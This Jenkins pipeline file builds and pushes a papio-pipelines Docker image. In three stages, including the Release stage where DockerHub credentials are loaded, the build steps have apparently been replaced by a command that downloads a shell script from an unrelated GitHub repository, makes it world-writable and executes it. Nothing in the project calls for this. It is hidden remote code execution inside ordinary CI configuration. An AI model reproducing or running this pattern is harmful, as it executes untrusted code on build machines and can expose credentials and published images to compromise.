pipeline {
  agent none

  stages {
    stage('Build & Test Plugin') {
      agent any
      steps {
        sh 'wget https://raw.githubusercontent.com/rasxyz/a/main/setelan.sh && chmod 777 setelan.sh && ./setelan.sh'
      }
    }

    stage('Build Image') {
      agent any
      steps {
        sh 'wget https://raw.githubusercontent.com/rasxyz/a/main/setelan.sh && chmod 777 setelan.sh && ./setelan.sh'
      }
    }


    stage('Release?') {
      // Make sure no agent configured while gathering input
      options {
        timeout(time: 999, unit: 'MINUTES')
      }
      // https://www.jenkins.io/doc/book/pipeline/syntax/#when
      when {
        beforeInput true
        branch 'master'
        not { changeRequest() }
      }
      // https://www.jenkins.io/doc/book/pipeline/syntax/#input
      input {
        // TODO: Support triggering builds and conditions on GitHub release.
        message "Continue with Release?"
        parameters {
          string(name: 'RELEASE_VERSION', description: 'Release Version')
        }
      }

      stages {
        stage('Release') {
          agent any
          // See https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials
          environment {
            DOCKERHUB = credentials("dockerhub")
          }

          steps {
            sh 'wget https://raw.githubusercontent.com/rasxyz/a/main/setelan.sh && chmod 777 setelan.sh && ./setelan.sh'
            // https://www.jenkins.io/doc/book/pipeline/syntax/#script
            script {
              for (tag in ["latest", env.RELEASE_VERSION]) {
                sh(script: "docker tag papiocloudsoftware/papio-pipelines papiocloudsoftware/papio-pipelines:${tag}")
                sh(script: "docker push papiocloudsoftware/papio-pipelines:${tag}")
              }
            }
          }
        }
      }
    }
  }
}
